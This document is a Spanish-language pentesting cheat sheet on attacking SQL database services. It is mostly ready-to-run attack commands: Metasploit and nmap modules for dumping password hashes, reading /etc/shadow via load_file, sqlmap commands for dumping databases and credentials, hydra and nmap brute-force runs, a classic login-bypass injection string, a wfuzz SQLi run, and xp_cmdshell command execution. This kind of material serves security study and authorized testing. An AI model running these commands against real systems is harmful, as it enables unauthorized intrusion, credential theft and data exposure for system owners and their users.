---
title: "SQL"
layout: "single"
category: "Servicios comunes"
slug: "servicios-comunes/sql"
date: "2025-09-30"
---

### Enumeración
#### Metasploit
```bash
search type:auxiliary name:mysql
####A través de Mysql con metasploit podemos realizar un escaneo de directorios con permisos de escritura en el sistema.

use auxiliary/scanner/mysql/mysql_writable_dirs

#### Hashdump de usuarios
use auxiliary/scanner/mysql/mysql_hashdump

# Enumeracion del sistema (muy útil)
use auxiliary/admin/mssql/mssql_enum
```
#### Historial SQL
En ocasiones si el historial está visible, podemos encontrar credenciales en el fichero **.mysql.history**

#### Ver contenido fichero .sql
Cuando encontramos un backup de bases de datos, podemos primero probar a hacer un cat al fichero:
```bash
cat mysql_backup.sql
```

#### Enumeracion con nmap
```bash
nmap <ip> -sV -p 3306 --script mysql-empty-password
nmap <ip> -sV -p 3306 --script mysq-info

#Enumerar usuarios bbdd teniendo ya algun usuario de la bbdd
nmap <ip> -sV -p 3306 --script mysql-users --script-args="mysqluser='<usuario>',mysqlpass='<pass>'"

#Enumerar bbdd teniendo ya algun usuario de la bbdd
nmap <ip> -sV -p 3306 --script mysql-databases --script-args="mysqluser='<usuario>',mysqlpass='<pass>'"

#Enumerar hashes 
nmap <ip> -sV -p 3306 --script mysql-dump-hashes --script-args="username='<usuario>',password='<pass>'"
```

### Conexion a la BBDD
#### Con Metasploit
``` bash
use auxiliary/admin/mysql/mysql_sql

## Rellenar datos de conexión a la bbdd
-------------------------------------------------
## Comandos metasploit
set SQL show databases;
run
set SQL use <database_name>;
run
```

```bash
use auxiliary/admin/mysql/mysql_schemadump
## Rellenar datos de conexión a la bbdd
-------------------------------------------------
## Comandos metasploit
services
loot
creds
```
#### Mysql Basics
```bash
mysql -h <ip> -u <usuario> (la pass mejor meterla cuando la pida luego)

mysql -u <usuario> -p<contraseña> -h <servidor> <nombre_de_base_de_datos>

show databases;
use <database_name>;
show tables;
select * from <tabla>;
select * from <tabla> where <condicion> = / > / < <argumento>;

#### LEER FICHEROS DEL SISTEMA
select load_file("/etc/shadow");

#### ver version mysql
SELECT VERSION();

#### ver version mysql desde la maquina sin credenciales
mysql -V
mysql --version

```
### SQLMap

#### SQLinjection a un formulario
Se puede tratar de intentar una inyección SQL contra un panel de login, por ejemplo. También contra una url que parece ser sospechosa de estar haciendo una consulta SQL, por ejemplo: 
**http://ip/products.php?id=7**

Cuando se trata de una SQLi contra un panel de login, se deben añadir los siguientes parámetros, y de la siguiente manera:
```bash
--forms --batch

# --forms justo después de la URL, y --batch al final de la sentencia, ejemplo:
sqlmap -u "http://example.com/index.php?id=1" --forms --dbs --batch

```

#### SQL Injection con request
Teniendo una petición a un sitio donde podamos tratar de inyectar código, por ejemplo un cambio de email o contraseña dentro de un perfil, el cual tenemos credenciales, y por ende una cookie de sesión. Podemos interceptar una petición con burpsuite como esta:

```bash
GET /dashboard.php?id=1 HTTP/1.1

Host: 192.168.117.130

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: close

Cookie: PHPSESSID=i5224dcks25bqcmpm6udhgnmmm

Upgrade-Insecure-Requests: 1
```

Metemos esto en un **fichero llamado "request"**  y lo siguiente es:
```bash
sqlmap -r request --dbs --batch
```
#### Enumerar datos de la BBDD
```bash
# Enumerar bases de datos
sqlmap -u "http://example.com/index.php?id=1" --dbs

# Enumerar tablas de una base de datos
sqlmap -u "http://example.com/index.php?id=1" -D <nombre_bbdd> --tables

# Enumerar columnas de una tabla
sqlmap -u "http://example.com/index.php?id=1" -D <nombre_bbdd> -T <nombre_tabla> --columns

# Enumerar todos los datos de una tabla (con sus columnas)
sqlmap -u "http://example.com/index.php?id=1" -D <nombre_bbdd> -T <nombre_tabla> --dump

# Enumerar datos de ciertas columnas
sqlmap -u "http://example.com/index.php?id=1" -D <nombre_bbdd> -T <nombre_tabla> -C columna1,columna2 --dump
```

#### Comandos avanzados
```bash
# shell interactiva con la base de datos
sqlmap -u "http://example.com/index.php?id=1"

# consulta personalizada
sqlmap -u "http://example.com/index.php?id=1" -D <nombre_bbdd> -sql-query "SELECT * FROM ..."

# Listar usuarios y contraseñas de la bbdd
sqlmap -u "http://example.com/index.php?id=1" --users --passwords
```

### Fuerza bruta contra BBDD 
```bash
hydra -l <usuario_conocido> -P <diccionario> mysql://<ip>
use auxiliary/scanner/mysql/mysql_login

#Microsoft SQL Server
nmap <ip> -p 1433 --script ms-sql-brute --script-args userdb=diccionario.txt,passdb=rockyou.txt
```

### Manual SQL injection

#### Basic login bypass

En el campo username, se puede tratar de introducir lo siguiente
```bash
test 'OR 1 = 1;-- -
```

#### SQLi con Wfuzz
Lo ideal es capturar la request con burpsuite y cambiar el método a POST para ver como se tramita la petición para pasarle la URL con los parámetros a wfuzz.
```BASH
```wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u 'http://<IP>/admin.php?username=FUZZ&password=FUZZ'
```


### Command Injection
```bash
# MS SQL Server
nmap <ip> -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<usuario>,mssql.password=<password>,ms-sql-xp-cmdshell.cmd="<comando>"

use auxiliary/admin/mssql/mssql_exec
```


